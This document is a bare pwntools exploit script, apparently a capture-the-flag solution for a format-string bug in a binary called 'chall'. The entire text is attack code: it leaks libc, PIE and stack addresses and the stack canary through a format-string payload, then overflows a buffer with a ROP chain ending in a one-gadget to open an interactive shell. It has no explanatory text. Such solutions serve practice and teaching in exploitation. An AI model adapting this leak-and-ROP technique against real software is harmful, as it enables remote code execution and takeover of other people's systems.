"""
fsb

"""

from pwn import *

#io = process('./chall')

io.sendlineafter(b'ur name:',b'%p%49$p%3$p%47$p')
io.recvn(1)
libb = io.recvn(14)
libb = int(libb,16) - 1911555
pieb = io. recvn(14)
pieb = int(pieb,16) - 4814

stack = io. recvn(14)
stack = int(stack,16) - (0xe0 - 0xa0)

can = io. recvn(18)
can = int(can,16)

prdi = libb + 0x00000000000277e5
ret = prdi+1
popr13 = libb + 0x0000000000029830
og = libb + 0xd515f
print(b'libc_base : ', hex(libb))
print(b'pie_base : ', hex(pieb))
print(b'stack : ', hex(stack))
print(b'canary : ', hex(can))

data = b'cat * ;\x00'+b'A'*(64+264-8) +p64(can)+p64(stack) + p64(ret) + p64(prdi) + b'\x00'*8 + p64(popr13) + b'\x00'*8 + p64(og)
io.sendlineafter(b'send your msg:', data)


io.interactive()
